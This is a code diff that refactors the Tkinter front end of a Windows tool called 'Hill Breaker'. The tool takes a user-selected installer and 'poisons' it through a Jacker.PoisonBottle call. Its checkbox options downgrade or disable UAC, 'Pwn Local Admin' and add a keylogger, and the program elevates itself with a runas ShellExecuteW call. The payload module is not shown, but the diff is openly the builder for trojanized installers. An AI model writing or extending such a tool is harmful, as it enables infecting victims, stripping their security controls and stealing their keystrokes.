@@ -8,26 +8,28 @@ from sys import executable, argv
 from os import getlogin
 
 c = (windll.shell32)
-installer = ""
 
 windll.shcore.SetProcessDpiAwareness(1) #Blurry fonts - https://stackoverflow.com/questions/41315873
 
-#Upload a file to poisoner
-def Upload():
-    installer = filedialog.askopenfilename()
-    selected.config(text=installer)
+class Methods():
+    def __init__(self) :
+        self.installer = ""
+    #Upload a file to poisoner
+    def Upload():
+        Methods.installer = filedialog.askopenfilename()
+        selected.config(text=Methods.installer)
 
-#Elevate Hill breaker
-def Elevate():
-    c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
-    if c.IsUserAnAdmin():
-        quit() # After new elevated script is running, Keep Yourself Safe #03
-    else:
-        tkinter.messagebox.showerror(title='Hill Breaker', message='Failed to elevate program.')
+    #Elevate Hill breaker
+    def Elevate():
+        c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
+        if c.IsUserAnAdmin():
+            quit() # After new elevated script is running, Keep Yourself Safe #03
+        else:
+            tkinter.messagebox.showerror(title='Hill Breaker', message='Failed to elevate program.')
 
-#Create poisoned file
-def Create():
-    Jacker.PoisonBottle(installer, includeUACdowngrade.get(), includeUACdisable.get(), includePWNadmin.get(), includeKeylog.get())
+    #Create poisoned file
+    def Create():
+        Jacker.PoisonBottle(Methods.installer, includeUACdowngrade.get(), includeUACdisable.get(), includePWNadmin.get(), includeKeylog.get())
 
 #Hill Breaker
 
@@ -49,11 +51,14 @@ tab.pack(expand=1, fill='both')
 
 #Home
 admin = LabelFrame(home,text="Elevation Status",padx=10,pady=10,bg='#888888',borderwidth=5)
-status = Label(admin,text="Program is not currently elevated.",bg='#888888').pack(anchor='nw')
-elevate = Button(admin,text="Elevate",command=lambda : Elevate(),borderwidth=5)
+status = Label(admin,text="Program is not currently elevated.",bg='#888888')
+elevate = Button(admin,text="Elevate",command=lambda : Methods.Elevate(),borderwidth=5)
+
 if c.IsUserAnAdmin(): # Can probably do this all with a text variable and returns and blah blah
     status.config(text="Program is running as elevated under " + getlogin()) # Probably better to just not do this in python
     elevate.config(disabled=1)
+
+status.pack(anchor='nw')
 admin.pack(anchor='nw')
 
 
@@ -75,8 +80,8 @@ disableUAC = Checkbutton(poisonOptions,text="Disable UAC",bg='#888888',variable=
 pwnadmin = Checkbutton(poisonOptions,text="Pwn Local Admin",bg='#888888',variable=includePWNadmin)
 keylog = Checkbutton(poisonOptions,text="Keylog",bg='#888888',variable=includeKeylog)
 
-uploadfile = Button(uploader,text="Upload file",command=lambda : Upload(),borderwidth=5)
-create = Button(poisonOptions,text="Create",command= lambda : Create(),borderwidth=5)
+uploadfile = Button(uploader,text="Upload file",command=lambda : Methods.Upload(),borderwidth=5)
+create = Button(poisonOptions,text="Create",command=lambda : Methods.Create(),borderwidth=5)
 
 info.pack(anchor='nw')
 elevate.pack(anchor='nw')          
